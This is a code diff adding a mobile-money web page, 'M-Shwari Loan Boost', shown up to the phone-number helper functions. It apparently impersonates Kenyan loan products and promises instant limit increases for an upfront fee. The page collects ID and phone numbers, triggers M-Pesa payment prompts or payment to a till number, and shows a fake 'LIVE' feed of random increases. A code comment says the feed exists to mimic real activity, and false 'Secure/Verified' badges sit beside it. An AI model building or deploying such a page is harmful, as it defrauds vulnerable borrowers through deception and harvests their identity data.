@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Loan Boost - Instant Limit Increase</title>
+  
+  <!-- Fonts & Icons -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>
+  
+  <!-- SweetAlert2 -->
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
+
+  <style>
+    /* ===================== RESET & BASE ===================== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #eef5ee;
+      font-family: "Source Sans Pro", sans-serif;
+      min-height: 100vh;
+    }
+    .screen {
+      display: none;
+    }
+    .screen.active {
+      display: block;
+    }
+
+    /* ===================== HERO ===================== */
+    .hero-banner {
+      position: relative;
+      width: 100%;
+      min-height: 285px;
+      background-image: url('assets/hero-community-Bf3Fo1iQ.jpg');
+      background-size: cover;
+      background-position: center 47%;
+      background-repeat: no-repeat;
+      display: flex;
+      align-items: flex-start;
+      justify-content: flex-start;
+      overflow: hidden;
+    }
+    .hero-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, rgba(0, 62, 26, .88) 0%, rgba(0, 65, 29, .66) 40%, rgba(1, 32, 38, .03) 100%);
+    }
+    .hero-inner {
+      position: relative;
+      z-index: 1;
+      max-width: 1200px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 48px 30px;
+      text-align: left;
+    }
+    .brand-title {
+      font-size: 42px;
+      line-height: 1.1;
+      font-weight: 900;
+      margin: 0 0 8px;
+      white-space: nowrap;
+      text-align: left;
+    }
+    .brand-title span:first-child { color: #ffffff; }
+    .brand-title span:last-child { color: #b1f4b3; }
+    .brand-rise {
+      color: #42e46c;
+      font-size: .6em;
+      margin-left: 9px;
+      vertical-align: middle;
+    }
+    .brand-sub {
+      text-align: left;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      margin: 0;
+    }
+
+    /* ===================== MAIN UI ===================== */
+    :root {
+      --front-ink: #0b4d25;
+      --front-green: #078a1f;
+      --front-border: #ccebd7;
+    }
+    .main-wrapper {
+      position: relative;
+      z-index: 1;
+      max-width: 1050px;
+      margin: -56px auto 0;
+      padding: 18px 20px 16px;
+      border: 1px solid var(--front-border);
+      border-radius: 18px;
+      background: #ffffff;
+      box-shadow: 0 12px 34px rgba(0, 80, 27, .13);
+    }
+    
+    /* Programme Selector */
+    .program-selector {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .program-card {
+      position: relative;
+      background: #fff;
+      border: 1px solid var(--front-border);
+      border-radius: 9px;
+      padding: 16px 14px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 5px rgba(8, 88, 35, .08);
+    }
+    .program-card.selected {
+      background: linear-gradient(120deg, #f5fff8, #ffffff);
+      border-color: var(--front-green);
+      box-shadow: 0 2px 10px rgba(0, 150, 34, .23);
+    }
+    .program-card:hover { border-color: var(--front-green); }
+    .program-card .program-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: var(--front-ink);
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .program-card .program-desc {
+      font-size: 12px;
+      color: #52616c;
+    }
+    .program-card.selected .program-desc {
+      color: var(--front-green);
+      font-weight: 600;
+    }
+
+    .selection-heading {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      margin: 0 2px 21px;
+    }
+    .selection-heading-main {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-width: 0;
+    }
+    .selection-heading-icon {
+      display: grid;
+      place-items: center;
+      flex: 0 0 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #10b32d, #04771b);
+      color: #fff;
+      font-size: 20px;
+    }
+    .selection-heading h1 {
+      font-size: 24px;
+      line-height: 1.1;
+      font-weight: 800;
+      margin: 0 0 3px;
+      color: var(--front-ink);
+    }
+    .selection-heading p {
+      font-size: 14px;
+      color: #556475;
+      margin: 0;
+    }
+    .info-box {
+      background: linear-gradient(100deg, #eaf9ef, #e6f7ea);
+      border-radius: 9px;
+      padding: 12px 16px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 13px;
+      color: #244c34;
+    }
+    .info-box i { color: var(--front-ink); font-size: 14px; }
+    
+    /* ===================== RECENT BOX & LIVE BADGE ===================== */
+    .recent-box {
+      background: linear-gradient(100deg, #eaf9ef, #e6f7ea);
+      position: relative;
+      padding: 13px 16px 14px 16px;
+      margin-bottom: 16px;
+      border-radius: 9px;
+      min-height: 64px;
+    }
+    .recent-title {
+      color: var(--front-ink);
+      font-weight: 700;
+      font-size: 15px;
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+    }
+    .recent-title-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .recent-title i { font-size: 19px; margin-right: 4px; }
+    
+    .live-badge {
+      color: #16a34a;
+      font-size: 10px;
+      font-weight: 800;
+      background: #dcfce7;
+      padding: 3px 10px;
+      border-radius: 999px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      letter-spacing: 0.5px;
+    }
+    .live-badge::before {
+      content: '';
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      background: #16a34a;
+      border-radius: 50%;
+      animation: pulse-dot 1.5s infinite;
+    }
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.3; transform: scale(0.7); }
+    }
+
+    .recent-loan-item {
+      margin-left: 0;
+      color: #55786a;
+      font-size: 13px;
+      transition: opacity 0.3s ease;
+    }
+    .recent-loan-item.fade-out { opacity: 0; }
+
+    .progress-deco {
+      height: 5px;
+      margin: 0 0 16px;
+      border-radius: 4px;
+      background: linear-gradient(to right, #074c20 0 27%, #e92c55 27% 37%, #0a9b22 37% 100%);
+    }
+
+    .card {
+      border: 1px solid var(--front-border);
+      border-radius: 13px;
+      padding: 15px;
+      box-shadow: 0 2px 9px rgba(0, 84, 35, .07);
+      background: #fff;
+    }
+    .card-title {
+      color: var(--front-ink);
+      font-size: 16px;
+      font-weight: 800;
+      margin-bottom: 17px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .card-title i {
+      background: linear-gradient(135deg, #109639, #065126);
+      border-radius: 5px;
+      width: 25px;
+      height: 25px;
+      font-size: 13px;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Loan Grid */
+    .loan-options-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .loan-option {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-height: 80px;
+      padding: 14px 6px 10px;
+      border: 1px solid var(--front-border);
+      border-radius: 9px;
+      box-shadow: 0 2px 5px rgba(8, 88, 35, .08);
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      background: #fff;
+    }
+    .loan-option.selected {
+      background: linear-gradient(120deg, #f5fff8, #ffffff);
+      border-color: var(--front-green);
+      box-shadow: 0 2px 10px rgba(0, 150, 34, .23);
+    }
+    .loan-option:hover { border-color: var(--front-green); }
+    .loan-amount {
+      color: var(--front-ink);
+      font-size: 17px;
+      font-weight: 800;
+      margin-bottom: 6px;
+      white-space: nowrap;
+    }
+    .loan-fee {
+      align-self: center;
+      font-size: 11px;
+      background: #edf0f2;
+      color: #52616c;
+      padding: 4px 10px;
+      border-radius: 20px;
+      white-space: nowrap;
+    }
+    .loan-option.selected .loan-fee {
+      background: var(--front-green);
+      color: #fff;
+    }
+    .selected-check {
+      position: absolute;
+      top: 6px;
+      right: 6px;
+      color: var(--front-green);
+      font-size: 16px;
+    }
+    .loan-badge {
+      position: absolute;
+      top: -8px;
+      right: -3px;
+      padding: 4px 9px;
+      border-radius: 50px;
+      font-size: 10px;
+      font-weight: 800;
+      color: white;
+      white-space: nowrap;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+    }
+    .loan-badge.popular { background: #f5a623; }
+    .loan-badge.premium { background: #1f5fe0; }
+    .loan-badge.max { background: #d81b60; }
+
+    .btn-get-now {
+      height: 52px;
+      background: linear-gradient(100deg, #047514, #078d1b);
+      border-radius: 30px;
+      font-family: inherit;
+      font-size: 17px;
+      font-weight: 800;
+      color: #fff;
+      border: none;
+      width: 100%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: 0.3s ease;
+    }
+    .btn-get-now:hover { background: linear-gradient(100deg, #065e15, #087b1b); }
+
+    /* ===================== SECURITY BADGES ===================== */
+    .security-badges {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 0;
+      margin-top: 14px;
+      border: 1px solid #ddf0e3;
+      border-radius: 9px;
+      overflow: hidden;
+      background: #f0fbf4;
+    }
+    .security-badge {
+      min-width: 0;
+      min-height: 55px;
+      border-right: 1px solid #fff;
+      gap: 9px;
+      padding: 8px 10px;
+      color: var(--front-ink);
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+    }
+    .security-badge:last-child { border: 0; }
+    .security-badge i { font-size: 16px; }
+    .security-badge span { display: flex; flex-direction: column; min-width: 0; }
+    .security-badge small { display: block; margin-top: 3px; font-size: 10px; color: #6c7e78; }
+
+    /* ===================== FORMS & MODALS ===================== */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(80, 100, 80, 0.5);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-overlay.show { display: flex; }
+    .modal-content {
+      background: white;
+      border-radius: 20px;
+      max-width: 480px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      animation: modalSlideIn 0.3s ease;
+    }
+    @keyframes modalSlideIn {
+      from { opacity: 0; transform: translateY(-30px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .modal-icon-wrap { display: flex; justify-content: center; padding: 30px 20px 10px; }
+    .modal-icon-circle {
+      width: 56px; height: 56px;
+      border: 2.5px solid #7ec8e3;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #7ec8e3; font-size: 22px;
+    }
+    .modal-body { padding: 10px 32px 32px; }
+    .modal-body h3 { text-align: center; font-size: 22px; font-weight: 800; color: #1a7a1a; margin-bottom: 6px; }
+    .modal-sub { text-align: center; color: #888; font-size: 14px; margin-bottom: 24px; }
+    .field-label { font-size: 13.5px; font-weight: 700; color: #1a7a1a; margin-bottom: 8px; }
+    .form-input {
+      width: 100%; border: 1.5px solid #d0e8d0; border-radius: 10px;
+      padding: 13px 16px; font-size: 15px; margin-bottom: 20px;
+      outline: none; font-family: inherit; color: #2d2d2d;
+    }
+    .form-input:focus { border-color: #1a7a1a; }
+    .phone-row { display: flex; margin-bottom: 20px; }
+    .phone-prefix {
+      background: #f4faf4; border: 1.5px solid #d0e8d0; border-right: none;
+      border-radius: 10px 0 0 10px; padding: 13px 14px; font-size: 15px; font-weight: 700;
+    }
+    .phone-input {
+      flex: 1; border: 1.5px solid #d0e8d0; border-radius: 0 10px 10px 0;
+      padding: 13px 16px; font-size: 15px; outline: none; font-family: inherit;
+    }
+    .phone-input:focus { border-color: #1a7a1a; }
+    .mpesa-note {
+      background: #f4faf4; border-radius: 8px; padding: 10px 14px;
+      font-size: 13px; color: #5a7a5a; margin-bottom: 24px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .btn-continue {
+      background: #1a7a1a; color: white; border: none; border-radius: 50px;
+      padding: 15px; font-size: 17px; font-weight: 700; width: 100%;
+      cursor: pointer; margin-bottom: 12px;
+    }
+    .btn-continue:hover { background: #145c14; }
+    .btn-cancel-modal {
+      background: #f4f4f4; color: #666; border: none; border-radius: 50px;
+      padding: 14px; font-size: 16px; width: 100%; cursor: pointer;
+    }
+
+    /* ===================== SWEETALERT2 CUSTOM STYLES ===================== */
+    .swal2-popup { border-radius: 16px !important; padding: 20px !important; max-width: 92% !important; width: auto !important; margin: 0 10px !important; }
+    .swal2-title { color: #1a7a1a !important; font-weight: 700 !important; font-size: 1.1rem !important; margin-bottom: 10px !important; line-height: 1.3 !important; }
+    .swal2-html-container { margin: 0 !important; padding: 0 !important; }
+    .swal2-confirm { background: linear-gradient(90deg, #1a7a1a, #00662a) !important; border-radius: 10px !important; font-weight: 600 !important; padding: 12px 24px !important; font-size: 0.9rem !important; margin-top: 10px !important; width: 100% !important; }
+    .swal2-cancel { background: #f8f9f7 !important; border: 2px solid #dfe7df !important; border-radius: 10px !important; color: #6b6b6b !important; font-weight: 500 !important; padding: 12px 24px !important; font-size: 0.9rem !important; margin-top: 6px !important; width: 100% !important; }
+    .swal2-actions { flex-direction: column !important; width: 100% !important; margin-top: 14px !important; }
+
+    .payment-confirm-content { padding: 0 4px; text-align: center; }
+    .payment-confirm-icon { font-size: 2.2rem !important; color: #1a7a1a; margin-bottom: 10px; }
+    .payment-details-box { background: #f8f9f7; padding: 10px; border-radius: 10px; margin-bottom: 12px; }
+    .payment-detail-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 0.85rem; }
+    .payment-detail-row:last-child { margin-bottom: 0; }
+    .payment-phone-note { color: #666; font-size: 0.75rem; margin-top: 8px; line-height: 1.3; }
+
+    .stk-push-content { text-align: center; padding: 0 4px; }
+    .stk-push-icon { font-size: 2.2rem !important; color: #1a7a1a; margin-bottom: 10px; }
+    .stk-phone-display { background: #f8f9f7; padding: 8px; border-radius: 8px; margin: 10px 0; font-weight: 600; font-size: 0.9rem; }
+
+    .success-icon { font-size: 2.8rem !important; color: #22c55e; margin-bottom: 10px; }
+    
+    /* Manual payment fallback styles */
+    .manual-payment-box { background: #fef9e3; border-left: 4px solid #f59e0b; padding: 16px; border-radius: 16px; margin: 12px 0; text-align: left; }
+    .manual-payment-box i { color: #f59e0b; margin-right: 6px; }
+    .copy-till { display: flex; gap: 8px; align-items: center; background: white; padding: 8px 12px; border-radius: 40px; margin: 12px 0; border: 1px solid #dfe7df; flex-wrap: wrap; }
+    .till-number { font-family: 'Courier New', monospace; font-size: 1.2rem; font-weight: 700; background: #f3f4f6; padding: 6px 14px; border-radius: 40px; letter-spacing: 1px; color: #1a7a1a; }
+    .copy-btn-sm { background: #1a7a1a; color: #fff; border: none; padding: 6px 16px; border-radius: 40px; font-weight: 600; font-size: 0.75rem; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; gap: 4px; }
+    .copy-btn-sm:hover { transform: scale(1.04); box-shadow: 0 2px 8px rgba(26, 122, 26, 0.25); }
+    .manual-input-group { margin-top: 12px; }
+    .manual-input-group label { display: block; font-size: 0.75rem; font-weight: 600; color: #6b6b6b; margin-bottom: 4px; }
+    .manual-input-group textarea { width: 100%; padding: 10px 12px; border: 2px solid #dfe7df; border-radius: 10px; font-size: 0.8rem; font-family: inherit; resize: vertical; min-height: 60px; outline: none; transition: border 0.2s, box-shadow 0.2s; background: white; }
+    .manual-input-group textarea:focus { border-color: #1a7a1a; box-shadow: 0 0 0 2px rgba(26, 122, 26, 0.1); }
+    .manual-input-group textarea.error { border-color: #ef4444 !important; box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2) !important; }
+    .manual-input-group .error-msg { color: #ef4444; font-size: 0.7rem; margin-top: 4px; display: none; }
+    .manual-input-group .error-msg.show { display: block; }
+    .manual-actions { display: flex; flex-direction: column; gap: 8px; margin-top: 14px; }
+    .manual-actions .btn-primary { background: linear-gradient(90deg, #1a7a1a 0%, #00662a 100%); border: none; border-radius: 999px; padding: 12px; color: #fff; font-weight: 700; font-size: 0.9rem; cursor: pointer; transition: 0.2s; box-shadow: 0 2px 8px rgba(26, 122, 26, 0.2); width: 100%; }
+    .manual-actions .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(26, 122, 26, 0.35); }
+    .manual-actions .btn-secondary { background: #f3f4f6; border: 1px solid #dfe7df; border-radius: 999px; padding: 12px; color: #6b6b6b; font-weight: 600; font-size: 0.85rem; cursor: pointer; transition: 0.2s; width: 100%; }
+    .manual-actions .btn-secondary:hover { background: #e5e7eb; }
+
+    .toast-copy {
+      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+      background: #1f2937; color: white; padding: 10px 24px; border-radius: 40px;
+      font-size: 0.85rem; font-weight: 500; z-index: 9999; opacity: 0; visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s; box-shadow: 0 4px 12px rgba(0,0,0,0.15); pointer-events: none;
+    }
+    .toast-copy.show { opacity: 1; visibility: visible; }
+
+    /* Responsive */
+    @media (max-width: 700px) {
+      .hero-banner { min-height: 240px; background-position: 68% center; }
+      .hero-inner { padding: 35px 22px; }
+      .brand-title { font-size: 32px; }
+      .main-wrapper { max-width: calc(100% - 28px); margin-top: -34px; padding: 15px 12px 12px; }
+      .selection-heading h1 { font-size: 20px; }
+      .loan-options-grid { gap: 10px; }
+      .loan-option { min-height: 75px; }
+      .loan-amount { font-size: 14px; }
+      .loan-fee { font-size: 10px; padding: 3px 5px; }
+      .security-badge { padding: 8px 5px; justify-content: center; gap: 5px; font-size: 10px; }
+      .security-badge i { font-size: 12px; }
+      .security-badge small { display: none; }
+    }
+    @media (max-width: 420px) {
+      .loan-options-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .security-badges { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .security-badge small { display: block; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="toastCopy" class="toast-copy">Till number copied!</div>
+
+  <!-- ===================== MAIN SCREEN ===================== -->
+  <div class="screen active" id="screen-main">
+    <!-- Hero Banner with Image -->
+    <section class="hero-banner">
+      <div class="hero-overlay"></div>
+      <div class="hero-inner">
+        <div class="brand-title" id="hero-title">
+          <span>M-Shwari</span><span>Loan Boost</span>
+          <i class="fas fa-chart-line brand-rise" aria-hidden="true"></i>
+        </div>
+        <div class="brand-sub" id="hero-sub">Increase Your M-Shwari Loan Limit Instantly</div>
+      </div>
+    </section>
+
+    <div class="main-wrapper">
+      
+      <!-- Programme Selector -->
+      <div class="program-selector">
+        <div class="program-card selected" id="prog-mshwari" onclick="setProgram('mshwari')">
+          <div class="program-title"><i class="fas fa-piggy-bank"></i> M-Shwari</div>
+          <div class="program-desc">Boost your M-Shwari limit</div>
+        </div>
+        <div class="program-card" id="prog-fuliza" onclick="setProgram('fuliza')">
+          <div class="program-title"><i class="fas fa-wallet"></i> Pochi Fuliza</div>
+          <div class="program-desc">Boost your Pochi Fuliza limit</div>
+        </div>
+      </div>
+
+      <div class="selection-heading">
+        <div class="selection-heading-main">
+          <span class="selection-heading-icon"><i class="fas fa-bolt" aria-hidden="true"></i></span>
+          <div>
+            <h1 id="limit-title">Choose your M-Shwari limit</h1>
+            <p>Select the amount that works best for you.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="info-box">
+        <i class="fas fa-info"></i>
+        <span id="info-text">Choose your new M-Shwari limit and complete the payment to get instant access.</span>
+      </div>
+
+      <!-- Dynamic Live Feed -->
+      <div class="recent-box">
+        <div class="recent-title">
+          <div class="recent-title-left">
+            <i class="fas fa-chart-line" aria-hidden="true"></i> Recent increases
+          </div>
+          <span class="live-badge">LIVE</span>
+        </div>
+        <div class="recent-loan-item" id="live-feed-item">Loading latest increases...</div>
+      </div>
+
+      <div class="progress-deco"></div>
+
+      <div class="card">
+        <div class="card-title">
+          <i class="fas fa-credit-card"></i> <span id="card-title">Select Your M-Shwari Limit</span>
+        </div>
+        
+        <div class="loan-options-grid" id="limit-grid">
+          <!-- Rendered by JS -->
+        </div>
+
+        <button class="btn-get-now" id="btn-get-now">
+          <i class="fas fa-bolt"></i>
+          <span>Get Limit Now</span>
+          <i class="fas fa-arrow-right" aria-hidden="true"></i>
+        </button>
+
+        <!-- Security Badges -->
+        <div class="security-badges">
+          <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+            <span><strong>Secure</strong><small>Your data is safe</small></span>
+          </div>
+          <div class="security-badge">
+            <i class="fas fa-lock"></i>
+            <span><strong>Encrypted</strong><small>Protected payment</small></span>
+          </div>
+          <div class="security-badge">
+            <i class="fas fa-bolt"></i>
+            <span><strong>Instant</strong><small>Quick application</small></span>
+          </div>
+          <div class="security-badge">
+            <i class="fas fa-check-circle"></i>
+            <span><strong>Verified</strong><small>Payment confirmation</small></span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== DETAILS MODAL ===================== -->
+  <div class="modal-overlay" id="details-modal">
+    <div class="modal-content">
+      <div class="modal-icon-wrap">
+        <div class="modal-icon-circle"><i class="fas fa-info"></i></div>
+      </div>
+      <div class="modal-body">
+        <h3>Enter Your Details</h3>
+        <div class="modal-sub"><i class="fas fa-user-check" style="color:#aaa"></i> Provide your details to proceed</div>
+        
+        <div class="field-label"><i class="fas fa-id-card"></i> ID Number</div>
+        <input type="text" class="form-input" id="input-id" placeholder="Enter your ID number">
+        
+        <div class="field-label"><i class="fas fa-mobile-alt"></i> Phone Number</div>
+        <div class="phone-row">
+          <div class="phone-prefix">+254</div>
+          <input type="tel" class="form-input phone-input" id="input-phone" placeholder="712 345 678" style="margin-bottom:0">
+        </div>
+        
+        <div class="mpesa-note">
+          <i class="fas fa-info-circle" style="color:#1a7a1a"></i> We'll send an M-Pesa STK push to your phone number for payment
+        </div>
+        
+        <button class="btn-continue" id="btn-modal-continue">Continue to Payment</button>
+        <button class="btn-cancel-modal" id="btn-modal-cancel">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SweetAlert2 -->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+
+  <script>
+    // ─── CONFIGURATION ────────────────────────────────────────────────
+    const API_ENDPOINTS = {
+      initiatePayment: '/api/initiate-payment',
+      verifyPayment: '/api/verify-payment',
+      normalizePhone: '/api/normalize-phone'
+    };
+
+    const TILL_NUMBER = '1787901';
+
+    // Data Configuration
+    const programs = {
+      mshwari: {
+        name: 'M-Shwari',
+        heroWords: ['M-Shwari', 'Loan Boost'],
+        subtitle: 'Increase Your M-Shwari Loan Limit Instantly',
+        cardTitle: 'Select Your M-Shwari Limit',
+        limits: [
+          { amount: 5000, fee: 79 },
+          { amount: 8500, fee: 240 },
+          { amount: 12500, fee: 410, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 20000, fee: 740 },
+          { amount: 25500, fee: 910 },
+          { amount: 30000, fee: 1050, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 35000, fee: 1250 },
+          { amount: 40000, fee: 1450 },
+          { amount: 45000, fee: 1700 },
+          { amount: 50000, fee: 2000, badge: "Premium", badgeClass: "premium" },
+          { amount: 55000, fee: 2500 },
+          { amount: 60000, fee: 3000, badge: "Max Limit", badgeClass: "max" }
+        ]
+      },
+      fuliza: {
+        name: 'Pochi Fuliza',
+        heroWords: ['Pochi', 'Fuliza'],
+        subtitle: 'Increase Your Pochi Fuliza Limit Instantly',
+        cardTitle: 'Select Your Pochi Fuliza Limit',
+        limits: [
+          { amount: 5000, fee: 79 },
+          { amount: 8500, fee: 240 },
+          { amount: 12500, fee: 410, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 20000, fee: 740 },
+          { amount: 25500, fee: 910 },
+          { amount: 30000, fee: 1050, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 35000, fee: 1250 },
+          { amount: 40000, fee: 1450 },
+          { amount: 45000, fee: 1700 },
+          { amount: 50000, fee: 2000, badge: "Premium", badgeClass: "premium" },
+          { amount: 55000, fee: 2500 },
+          { amount: 60000, fee: 3000, badge: "Max Limit", badgeClass: "max" }
+        ]
+      }
+    };
+
+    // State
+    let currentProgramKey = 'mshwari';
+    let selectedLimit = programs[currentProgramKey].limits[0];
+    let userData = { idNumber: '', phoneNumber: '' };
+    let isProcessing = false;
+
+    // DOM Elements
+    const limitGrid = document.getElementById('limit-grid');
+    const btnGetNow = document.getElementById('btn-get-now');
+    const detailsModal = document.getElementById('details-modal');
+    const liveFeedItem = document.getElementById('live-feed-item');
+
+    // ─── LIVE FEED LOGIC ──────────────────────────────────────────────
+    const phonePrefixes = ['0712', '0723', '0710', '0725', '0722', '0728', '0711', '0713', '0727', '0706', '0715', '0720', '0716', '0729', '0708', '0718', '0721', '0705', '0719', '0724'];
+    const feedAmounts = [5000, 8500, 12500, 20000, 25500, 30000, 35000, 40000, 45000, 50000, 55000, 60000];
+    // Heavily weighted towards "just now" to mimic a fast-moving live feed
+    const feedTimes = ['just now', 'just now', 'just now', 'just now', 'just now', 'just now', '1 min ago', '2 mins ago', '3 mins ago', '5 mins ago'];
+    
+    let liveFeedData = [];
+    let liveFeedIndex = 0;
+
+    function generateLiveFeed() {
+      const data = [];
+      for (let i = 0; i < 30; i++) {
+        const prefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
+        const last2 = String(Math.floor(10 + Math.random() * 90));
+        const phone = `${prefix}****${last2}`;
+        const amount = feedAmounts[Math.floor(Math.random() * feedAmounts.length)];
+        const time = feedTimes[Math.floor(Math.random() * feedTimes.length)];
+        data.push({ phone, amount, time });
+      }
+      return data;
+    }
+
+    function startLiveFeed() {
+      liveFeedData = generateLiveFeed();
+      if (liveFeedData.length === 0) return;
+
+      const updateFeed = () => {
+        liveFeedItem.classList.add('fade-out');
+        
+        setTimeout(() => {
+          const item = liveFeedData[liveFeedIndex];
+          liveFeedItem.innerHTML = `${item.phone} increased to Ksh ${item.amount.toLocaleString()} - ${item.time}`;
+          liveFeedItem.classList.remove('fade-out');
+          
+          liveFeedIndex = (liveFeedIndex + 1) % liveFeedData.length;
+        }, 300); // Wait for fade out to finish
+      };
+
+      updateFeed(); // Initial call
+      setInterval(updateFeed, 2500); // Rotate every 2.5 seconds
+    }
+
+    // ─── TOAST HELPER ──────────────────────────────────────────────────
+    function showToast(message, duration = 2000) {
+      const toast = document.getElementById('toastCopy');
+      toast.textContent = message;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), duration);
+    }
+
+    // ─── PROGRAM SWITCHING ─────────────────────────────────────────────
+    function setProgram(programKey) {
+      currentProgramKey = programKey;
+      const prog = programs[programKey];
+
+      document.getElementById('prog-mshwari').classList.toggle('selected', programKey === 'mshwari');
+      document.getElementById('prog-fuliza').classList.toggle('selected', programKey === 'fuliza');
+
+      const titleEl = document.getElementById('hero-title');
+      titleEl.innerHTML = `<span>${prog.heroWords[0]}</span><span>${prog.heroWords[1]}</span> <i class="fas fa-chart-line brand-rise" aria-hidden="true"></i>`;
+      
+      document.getElementById('hero-sub').textContent = prog.subtitle;
+      document.getElementById('limit-title').textContent = `Choose your ${prog.name} limit`;
+      document.getElementById('card-title').textContent = prog.cardTitle;
+      document.getElementById('info-text').textContent = `Choose your new ${prog.name} limit and complete the payment to get instant access.`;
+
+      selectedLimit = prog.limits[0];
+      renderLimits();
+    }
+
+    // ─── RENDER LIMITS ────────────────────────────────────────────────
+    function renderLimits() {
+      const prog = programs[currentProgramKey];
+      
+      limitGrid.innerHTML = prog.limits.map((item) => `
+        <div class="loan-option ${item.amount === selectedLimit.amount ? 'selected' : ''}" data-amount="${item.amount}">
+          ${item.amount === selectedLimit.amount ? '<i class="fas fa-check-circle selected-check"></i>' : ''}
+          ${item.badge ? `<span class="loan-badge ${item.badgeClass}">${item.badge}</span>` : ''}
+          <div class="loan-amount">Ksh ${item.amount.toLocaleString()}</div>
+          <div class="loan-fee">Fee: Ksh ${item.fee.toLocaleString()}</div>
+        </div>
+      `).join('');
+      
+      btnGetNow.innerHTML = `<i class="fas fa-bolt"></i> <span>Get Ksh ${selectedLimit.amount.toLocaleString()} Now</span> <i class="fas fa-arrow-right"></i>`;
+      
+      document.querySelectorAll('.loan-option').forEach(el => {
+        el.addEventListener('click', () => {
+          const amt = parseInt(el.getAttribute('data-amount'));
+          selectedLimit = prog.limits.find(l => l.amount === amt);
+          renderLimits();
+        });
+      });
+    }
+
+    // ─── PHONE HELPERS ────────────────────────────────────────────────
+    function normalizePhoneInput(phone) {
+      let clean = phone.replace(/\D/g, '');
+      if (clean.startsWith('0')) clean = clean.substring(1);
+      if (clean.startsWith('254')) clean = clean.substring(3);
+      if (clean.length !== 9) throw new Error('Invalid phone number length');
+      if (!/^[17]/.test(clean)) throw new Error('Phone must start with 7 or 1');
+      return clean;
+    }
+
+    function formatPhoneForDisplay(phone) {
+      if (phone.length !== 9) return phone;
+      return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+    }
+
+    function formatPhoneForAPI(phone) {
+      return '254' + phone;
+    }
+
+    async function normalizePhoneNumber(phone) {
+      try {
+        if (API_ENDPOINTS.normalizePhone) {
+          const resp = await fetch(API_ENDPOINTS.normalizePhone, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
+          });
+          if (!resp.ok) throw new Error('Normalization failed');
+          const data = await resp.json();
+          return data.normalized_phone || formatPhoneForAPI(phone);
+        }
+        return formatPhoneForAPI(phone);
+      } catch (e) {
+        return formatPhoneForAPI(phone);
+      }
+    }
+
